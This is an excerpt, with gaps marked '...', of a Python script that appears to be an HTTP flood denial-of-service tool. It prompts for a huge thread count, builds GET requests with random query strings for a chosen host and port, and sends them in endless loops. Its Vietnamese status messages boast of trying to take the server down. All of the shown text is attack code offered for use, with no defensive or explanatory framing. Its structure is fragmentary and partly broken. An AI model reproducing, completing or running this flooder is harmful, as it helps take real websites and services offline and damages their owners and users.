...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input(" Threads [10000000]: "))
    except ValueError:
        threads = int(10000000)
        print (" Selected Threads " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('enter CÁI ĐI ')
    if choice6 == "":
        attack()
        print()
    else:
...
def attack():
    ...
    x     = int(0)
    error = int(0)
    req_code = int(90000000000000000000000)
    multiple = int(90000000000000000000000)
...
class Home(threading.Thread):
    ...
    def run(self):
        ...
        if method_attack == "1":
            ...
            get_host = 'GET' + " /?=" +str(random.randint(9000000000000,9000000000000000000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("Đã gửi HTTP RQ by code "  " => " +str(host_url)+ ":" +str(port))
                try:
                    for y in range(multiple):
                        ...
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        print("Đang-cố=>gắng+hạ&&gục server "  " => " +str(host_url)+ ":" +str(port))
                except:
                    try:
                        s.close()
                        error += 1
